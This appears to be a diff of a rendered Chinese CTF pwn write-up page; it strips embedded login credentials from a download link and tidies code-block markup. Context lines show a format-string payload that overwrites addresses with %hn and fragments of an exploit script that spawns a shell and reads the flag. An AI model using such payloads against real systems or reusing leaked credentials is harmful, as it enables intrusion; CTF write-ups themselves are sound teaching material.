@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -307,15 +307,14 @@
 <p>往<code>0x8049934</code> &mdash;&mdash;&gt; <code>0x84f0</code></p>
 </blockquote>
 <p>最后结合偏移量，最终的<code>payload</code>为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;aa&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%2032c</span><span class="s1">%21$hn&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%31884c</span><span class="s1">%22$hn&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%96c</span><span class="s1">%23$hna&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8049a56</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8049a54</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8049934</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%2032c</span><span class="s1">%21$hn&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%31884c</span><span class="s1">%22$hn&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%96c</span><span class="s1">%23$hna&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8049a56</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8049a54</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8049934</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后调试一下，看看是不是都改对了：</p>
 <p>修改前：</p>
@@ -327,7 +326,7 @@
 <p>输入<code>/bin/dash</code>即可得到<code>shell</code>。</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h4 id="完整exp">完整Exp</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -360,8 +359,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;cat flag&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div><div class="post-footer" id="post-footer">
   <div class="post-info">
